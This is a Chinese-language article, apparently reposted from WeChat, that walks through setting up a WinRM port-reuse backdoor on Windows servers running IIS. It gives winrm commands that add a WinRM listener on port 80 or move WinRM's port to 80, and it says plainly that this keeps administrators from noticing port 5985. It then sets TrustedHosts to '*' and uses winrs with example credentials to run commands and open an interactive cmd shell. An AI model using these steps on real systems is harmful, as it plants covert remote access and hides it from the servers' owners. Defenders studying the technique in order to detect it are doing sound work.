> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247493916&idx=2&sn=eacc42e5f8f68fc65dae1c8a1201f014&chksm=fc7bedc1cb0c64d7115c0c3bf84410e29102a25627891c9eb85cba2026b7bc3622a9ebb5e2b2&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/UZ1NGUYLEFhLz1H5qAkgh9wkAnWtKQNJd5gpJXE7XFR5qAuM2JpmdfLVUoDkug3r0BJF0TiaMK5vyiaYCEzwqeag/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490017&idx=1&sn=426336dfeeda818b0772b3c44703e173&chksm=fc781d3ccb0f942a7c07662752bb2f6983eb9c249c0d6b833f058b1d95fc7080d2d2598054ac&scene=21#wechat_redirect)

**目录**

  

WinRM 端口复用原理

端口复用配置

新增 80 端口监听

修改 WinRM 默认监听的端口

远程连接 WinRM

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC5x6JawVlxYwrsf4OxhIz1HzZrTT4UZAcukC3cKqetSHpGJABL8ZCM8yibLyNpvY2Zia3IAY3P6yE9A/640?wx_fmt=gif)

**WinRM 端口复用原理**
----------------

该端口复用的原理是使用 Windows 的远程管理服务 WinRM，结合 HTTP.sys 驱动自带的端口复用功能，一起实现正向的端口复用后门。

关于 WinRM 服务，传送门：WinRM 远程管理工具的使用 

而 HTTP.sys 驱动是 IIS 的主要组成部分，主要负责 HTTP 协议相关的处理，它有一个重要的功能叫 Port Sharing(端口共享)。所有基于 HTTP.sys 驱动的 HTTP 应用都可以共享同一个端口，只需要各自注册的 URL 前缀不一样。而 WinRM 就是在 HTTP.sys 上注册了 wsman 的 URL 前缀，默认监听 5985 端口。因此，在安装了 IIS 的 Windows 服务器上，开启 WinRM 服务后修改默认监听端口为 80 或新增一个 80 端口的监听即可实现端口复用，通过 Web 端口登录 Windows 服务器。

使用 netsh http  show  servicestate 命令可以查看所有在 HTTP.sys 驱动上注册过的 URL 前缀。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fg1GV1q6H2IRXooXnCxnZZGfg9N7p2sPtdlhC1gRmWJdDGN8bibhtqPaEdlSFNr0jjyvAe5cLrLoQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC5x6JawVlxYwrsf4OxhIz1HoaHEjBLqmAGrZlH8BTIAaGKt4xLxqt7gEL9Jj00Y7u9ic8Xy6EYiaVBQ/640?wx_fmt=gif)

**端口复用配置**
----------

### **新增 80 端口监听**

对于 Windows Server 2012 以上的服务器操作系统中，WinRM 服务默认启动并监听了 5985 端口。如果服务器本来就监听了 80 和 5985 端口，则所以我们既需要保留原本的 5985 监听端口，同时需要新增 Winrm 监听 80 端口。这样的话，WinRM 同时监听 80 和 5985 端口。既能保证原来的 5985 端口管理员可以正常使用，我们也能通过 80 端口远程连接 WinRM。

通过下面的命令，可以新增 WinRM 一个 80 端口的监听。

winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fg1GV1q6H2IRXooXnCxnZZbgU49ic6karjFU33HtHBSMymXibZrMSeRZ3CHcz2Ddcw7ykkARRdC4jg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fg1GV1q6H2IRXooXnCxnZZQGQcIWKMM4Farjicwa3XOKLAerl1PtH9kKTXMWzgm2529EiaQZHztfWw/640?wx_fmt=png)

查看监听端口，80 和 5985 都在监听

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fg1GV1q6H2IRXooXnCxnZZPswY4SP16UvP5yacJISiaOvic1JlzxXIb1JHXrZzGKC52ZXnaqCfPWgg/640?wx_fmt=png)

80 端口仍然可以正常访问网页

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fg1GV1q6H2IRXooXnCxnZZMlKLYR6ibCEsK0pC0vYic7W33qXjoibk2qb4A3SjicCCOiaxysGd6C3eGeg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC5x6JawVlxYwrsf4OxhIz1HoaHEjBLqmAGrZlH8BTIAaGKt4xLxqt7gEL9Jj00Y7u9ic8Xy6EYiaVBQ/640?wx_fmt=gif)

### **修改 WinRM 默认监听的端口**

如果该计算机上原本没有开启 WinRM 服务的话，则需要将 WinRm 端口监听端口修改为 80 端口。不然管理员看到该机器开起来 5985 端口的话，肯定会起疑心。

快速启动 WinRM

winrm  quickconfig  -q

修改 WinRM 默认端口为 80

winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}

### ![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fg1GV1q6H2IRXooXnCxnZZPkibkrfXKAIZV4OdJjDMB5OhXWuaNfMYtLeC71OlS2SPcib0HgPgiaFkw/640?wx_fmt=png)

查看监听端口，只有 80，没有 5985

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fg1GV1q6H2IRXooXnCxnZZzbJZwYNKoHsp4LNxVDT0XfPmyXiblQCR3hYKXI4snRle4Ex4NMGzndA/640?wx_fmt=png)

配置完成之后，原本的 HTTP 服务可以正常访问，我们也可以通过 80 端口进行远程 WinRM 连接管理。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fg1GV1q6H2IRXooXnCxnZZia2H1JUDoqpeDbfI1RwtkO6dAjIN2VOWGqgicNXHKnXc5f87URPZAuibQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC5x6JawVlxYwrsf4OxhIz1HoaHEjBLqmAGrZlH8BTIAaGKt4xLxqt7gEL9Jj00Y7u9ic8Xy6EYiaVBQ/640?wx_fmt=gif)

**远程连接 WinRM**
--------------

本地需要连接 WinRM 服务时，首先也需要配置启动 WinRM 服务。如果是工作组环境的话，还需要设置信任连接的主机，执行以下两条命令即可。

winrm quickconfig -q

winrm set winrm/config/Client @{TrustedHosts="*"}

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fg1GV1q6H2IRXooXnCxnZZ8MYicTDtWapHWibOWNRqFbhiczTsDD6eUjdIfW8ricdpBRyjrZB00iahJvw/640?wx_fmt=png)

通过 WinRM 连接，并执行 whoami 命令

winrs -r:http://192.168.10.20 -u:administrator -p:root whoami

通过 WinRM 连接，并获得交互式的 shell

winrs -r:http://192.168.10.20 -u:administrator -p:root cmd

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fg1GV1q6H2IRXooXnCxnZZvHib6HzfGrNibIk5oTgz9pgnNcahehoibQEK4RicledzM7tMfSKv4CNgog/640?wx_fmt=png)

  

[![](https://mmbiz.qpic.cn/mmbiz_jpg/UZ1NGUYLEFjWI9QibTmpF13L33cHIh2bSMLAI4tW7sTgTkzh4lRcZ6JR7SrOibCTYUEsg8ZsmyKnUBm7h4J5klZw/640?wx_fmt=jpeg)](https://mp.weixin.qq.com/s?__biz=MzA3NzM2MjAzMg==&mid=2657228904&idx=1&sn=aa0d7a52864f19cbd6245a46ce162a1f&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgag1b8Ubew6DhiceZ9tKengA7WrOUhVx2wCKjHy6GSFbZ3YLKjy6N7LB9p9p7eRNiapvEiax7b5N2Jg/640?wx_fmt=png)